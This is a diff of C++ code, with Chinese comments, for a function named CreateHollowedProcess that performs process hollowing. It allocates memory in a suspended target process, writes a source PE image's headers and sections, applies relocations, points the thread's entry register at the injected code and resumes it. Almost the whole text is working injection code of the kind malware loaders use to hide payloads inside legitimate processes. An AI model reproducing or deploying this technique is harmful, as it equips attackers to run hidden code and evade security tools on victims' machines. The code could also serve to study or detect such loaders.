@@ -51,14 +51,40 @@ HANDLE CreateHollowedProcess(LPSTR lpCommandLine, LPSTR lpSourceFile)
 		return hProcess;
 	}
 
+
+	//计算镜像大小
+	DWORD lastSectionEnd = 0;//最后节+数据长度的地址
+	DWORD endOfSection = 0;
+	SYSTEM_INFO sysInfo;
+	DWORD alignedImageSize = 0;
+
+	PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(pSourceHeader);
+	//节的对齐粒度
+	DWORD optionoalSectionSize = pSourceHeader->OptionalHeader.SectionAlignment;
+	for (int i = 0; i < (pSourceHeader->FileHeader.NumberOfSections); i++, section++)
+	{
+		//如果节中没有数据，则保留一节
+		if (section->SizeOfRawData == 0)
+			endOfSection = section->VirtualAddress + optionoalSectionSize;
+		else
+			endOfSection = section->VirtualAddress + (section->SizeOfRawData);
+		if (endOfSection > lastSectionEnd)
+			lastSectionEnd = endOfSection;
+	}
+	//通过系统信息获取页面大小
+	GetNativeSystemInfo(&sysInfo);
+	//最后一节与页面对齐
+	alignedImageSize = AlignValueUp(lastSectionEnd, sysInfo.dwPageSize);
+	if (alignedImageSize != AlignValueUp(lastSectionEnd, sysInfo.dwPageSize))
+		return hProcess;
 	cout << "-->Allocating Memory." << endl;
 	LPVOID pRemoteImage = VirtualAllocEx
 	(
 		lpProcessInformation->hProcess,
 		pPEB->lpImageBaseAddress,
-		pSourceHeader->OptionalHeader.SizeOfImage,
-		MEM_COMMIT | MEM_RESERVE,
-		PAGE_EXECUTE_READWRITE
+		alignedImageSize,
+		MEM_RESERVE,//参考Memory Module方式
+		PAGE_READWRITE
 	);
 	if (!pRemoteImage)
 	{
@@ -66,7 +92,7 @@ HANDLE CreateHollowedProcess(LPSTR lpCommandLine, LPSTR lpSourceFile)
 		cout << "-->Error Code:" << GetLastError() << endl;
 		return hProcess;
 	}
-	
+	//装载地址与默认地址的差值
 	ULONG_PTR upDelta = (ULONG_PTR)pPEB->lpImageBaseAddress - pSourceHeader->OptionalHeader.ImageBase;
 	cout << hex << "Source Image BaseAddress:" << pSourceHeader->OptionalHeader.ImageBase << endl;
 	cout << hex << "Destination Image BaseAddress:" << pPEB->lpImageBaseAddress << endl;
@@ -74,6 +100,17 @@ HANDLE CreateHollowedProcess(LPSTR lpCommandLine, LPSTR lpSourceFile)
 
 	pSourceHeader->OptionalHeader.ImageBase = (ULONG_PTR)pPEB->lpImageBaseAddress;
 	cout << "-->Writing Headers" << endl;
+
+	//提交内存
+	VirtualAllocEx
+	(
+		lpProcessInformation->hProcess,
+		pPEB->lpImageBaseAddress,
+		pSourceHeader->OptionalHeader.SizeOfHeaders,
+		MEM_COMMIT,//参考Memory Module方式
+		PAGE_READWRITE
+	);
+
 	if (!WriteProcessMemory
 	(
 		lpProcessInformation->hProcess,
@@ -87,104 +124,101 @@ HANDLE CreateHollowedProcess(LPSTR lpCommandLine, LPSTR lpSourceFile)
 		return hProcess;
 	}
 	cout << "-->Writing Sections." << endl;
-	//if (!CopySections(hProcess, (ULONG_PTR)pPEB->lpImageBaseAddress, (ULONG_PTR)pBuffer))
-	//{
-	//	cout << "Copy Secitons Failed." << endl;
-	//	return hProcess;
-	//}
-	for (DWORD x = 0; x < pSourceImage->NumberOfSections; x++)
+	if (!CopySections(hProcess, (ULONG_PTR)pPEB->lpImageBaseAddress, (ULONG_PTR)pBuffer))
 	{
-		if (!pSourceImage->Sections[x].PointerToRawData)
-			continue;
-
-		PVOID pSectionDestination =
-			(PVOID)((DWORD)pPEB->lpImageBaseAddress + pSourceImage->Sections[x].VirtualAddress);
-
-
-		if (!WriteProcessMemory
-		(
-			lpProcessInformation->hProcess,
-			pSectionDestination,
-			&pBuffer[pSourceImage->Sections[x].PointerToRawData],
-			pSourceImage->Sections[x].SizeOfRawData,
-			0
-		))
-		{
-			cout << "Writing Memory Failed." << endl;
-			return hProcess;
-		}
+		cout << "Copy Secitons Failed." << endl;
+		return hProcess;
 	}
-
-	if (upDelta)
+	cout << "-->Start Delta." << endl;
+	//开始重定位
+	if(upDelta)
 		for (DWORD x = 0; x < pSourceImage->NumberOfSections; x++)
 		{
-			char* pSectionName = ".reloc";
-
+		
+			LPSTR pSectionName = ".reloc";
 			if (memcmp(pSourceImage->Sections[x].Name, pSectionName, strlen(pSectionName)))
 				continue;
-
-			cout << "Rebase Image" << endl;
-
+			cout << "-->Rebasing Image." << endl;
+			//文件中的偏移
 			DWORD dwRelocAddr = pSourceImage->Sections[x].PointerToRawData;
 			DWORD dwOffset = 0;
-
-			IMAGE_DATA_DIRECTORY relocData =
-				pSourceHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
-
+			IMAGE_DATA_DIRECTORY relocData = pSourceHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
 			while (dwOffset < relocData.Size)
 			{
-				PBASE_RELOCATION_BLOCK pBlockheader =
-					(PBASE_RELOCATION_BLOCK)&pBuffer[dwRelocAddr + dwOffset];
-
+				PBASE_RELOCATION_BLOCK pBlockheader = (PBASE_RELOCATION_BLOCK)&pBuffer[dwRelocAddr + dwOffset];
 				dwOffset += sizeof(BASE_RELOCATION_BLOCK);
-
+				//重定位块中的重定位项数
 				DWORD dwEntryCount = CountRelocationEntries(pBlockheader->BlockSize);
 
-				PBASE_RELOCATION_ENTRY pBlocks =
-					(PBASE_RELOCATION_ENTRY)&pBuffer[dwRelocAddr + dwOffset];
-
+				PBASE_RELOCATION_ENTRY pBlockEntrys = (PBASE_RELOCATION_ENTRY)&pBuffer[dwRelocAddr + dwOffset];
 				for (DWORD y = 0; y < dwEntryCount; y++)
 				{
 					dwOffset += sizeof(BASE_RELOCATION_ENTRY);
-
-					if (pBlocks[y].Type == 0)
+					//
+					if (pBlockEntrys[y].Type == 0)
 						continue;
-
-					DWORD dwFieldAddress =
-						pBlockheader->PageAddress + pBlocks[y].Offset;
-
-					DWORD dwBuffer = 0;
+					DWORD dwFieldAddress = pBlockheader->PageAddress + pBlockEntrys[y].Offset;
+					ULONG_PTR upBuffer = 0;
 					ReadProcessMemory
 					(
-						lpProcessInformation->hProcess,
-						(PVOID)((DWORD)pPEB->lpImageBaseAddress + dwFieldAddress),
-						&dwBuffer,
-						sizeof(DWORD),
-						0
+						hProcess,
+						(PVOID)((ULONG_PTR)pPEB->lpImageBaseAddress + dwFieldAddress),
+						&upBuffer,
+						sizeof(ULONG_PTR), 0
 					);
 
-					//printf("Relocating 0x%p -> 0x%p\r\n", dwBuffer, dwBuffer - dwDelta);
-
-					dwBuffer += upDelta;
-
-					BOOL bSuccess = WriteProcessMemory
+					upBuffer += upDelta;
+					bool bSuccess = WriteProcessMemory
 					(
-						lpProcessInformation->hProcess,
-						(PVOID)((DWORD)pPEB->lpImageBaseAddress + dwFieldAddress),
-						&dwBuffer,
-						sizeof(DWORD),
+						hProcess,
+						(PVOID)((ULONG_PTR)pPEB->lpImageBaseAddress + dwFieldAddress),
+						&upBuffer,
+						sizeof(ULONG_PTR),
 						0
 					);
-
 					if (!bSuccess)
 					{
-						cout << "Writing Memory Failed" << endl;
+						cout << "Failed to Rebase" << endl;
 						continue;
 					}
-				}
-			}
+				}//end for
+			}//end while
 
 			break;
-		}
+		}//end for
+	if (!FinalizeSections(hProcess, (ULONG_PTR)pPEB->lpImageBaseAddress, (ULONG_PTR)pBuffer))
+	{
+		cout << "Finalize Section Failed." << endl;
+		return hProcess;
+	}
+	DWORD dwBreakpoint = 0xCC;
+	ULONG_PTR dwEntryPoint = (ULONG_PTR)pPEB->lpImageBaseAddress +
+		pSourceHeader->OptionalHeader.AddressOfEntryPoint;
+	LPCONTEXT pContext = new CONTEXT();
+	pContext->ContextFlags = CONTEXT_INTEGER;
+	cout << "-->Getting Thread Context." << endl;
+	if (!GetThreadContext(lpProcessInformation->hThread, pContext))
+	{
+		cout << "Get Context Failed." << endl;
+		return hProcess;
+	}
+#ifdef  _WIN64
+	pContext->Rax = dwEntryPoint;
+#else
+	pContext->Eax = dwEntryPoint;
+#endif //  _WIN64
+	cout << "Setting Thread Context." << endl;
+	if (!SetThreadContext(lpProcessInformation->hThread, pContext))
+	{
+		cout << "Setting Context Failed." << endl;
+		return hProcess;
+	}
+	cout << "Resuming Thread." << endl;
+	if (!ResumeThread(lpProcessInformation->hThread))
+	{
+		cout << "Resume Thread Failed" << endl;
+		return hProcess;
+	}
 	return hProcess;
+
 }
